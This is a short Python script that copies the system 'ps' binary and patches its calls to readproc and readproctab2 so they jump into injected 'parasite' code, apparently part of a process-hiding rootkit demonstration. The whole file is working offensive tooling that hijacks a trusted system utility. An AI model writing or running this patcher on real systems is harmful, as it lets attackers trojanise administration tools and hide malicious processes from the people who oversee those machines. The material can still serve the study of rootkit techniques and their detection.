# ----------------------------------------------------------------------------
# ps-patch.py
#
# Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
# This code is licensed under the MIT License (MIT). 
# ----------------------------------------------------------------------------
import os
import shutil
import subprocess

READPROC_PATCH = (
    b'\xe8\x22\xf4\xff\xff', # call readproc
    b'\xe8\x82\xdf\x3f\x00'  # call parasite_start_address
)

READPROCTAB2_PATCH = (
    b'\xe8\xc2\xf3\xff\xff', # call readproctab2
    b'\xe8\xb1\xe3\x3f\x00'  # call parasite_start_address +
                             # hijacked_readproctab2 offset
)

def ps_path():
    which_output = subprocess.check_output(['which', 'ps'])
    date_path = which_output.decode('utf-8').strip()
    return date_path

def ps_mod_path():
    file_abs_path = os.path.abspath(__file__)
    file_dir_path = os.path.dirname(file_abs_path)
    date_mod_path = file_dir_path + "/ps-modified"
    return date_mod_path

def make_ps_copy():
    dp = ps_path()
    dmp = ps_mod_path()
    print("[*] Copying " + dp + " to " + dmp)
    shutil.copy(dp, dmp)

def apply_patch(ps_bytes, patch):
    orig_bytes, patched_bytes = patch
    idx = ps_bytes.find(orig_bytes)
    if -1 == idx:
        print("[*] Couldn't find " + orig_bytes.hex() + " byte sequence")
        exit(1)
    print("[*] Applying patch " + patched_bytes.hex() + " at offset " + str(hex(idx)))
    ps_bytes = ps_bytes.replace(orig_bytes, patched_bytes)
    return ps_bytes

def apply_patches():
    make_ps_copy()

    pmp = ps_mod_path()
    ps_file = open(pmp, 'r+b')

    ps_bytes = ps_file.read()
    ps_file.seek(0)

    ps_bytes = apply_patch(ps_bytes, READPROC_PATCH)
    ps_bytes = apply_patch(ps_bytes, READPROCTAB2_PATCH)

    # Write modifications to disk.
    ps_file.write(ps_bytes)

    ps_file.close()

apply_patches()

print("[*] Done applying patches")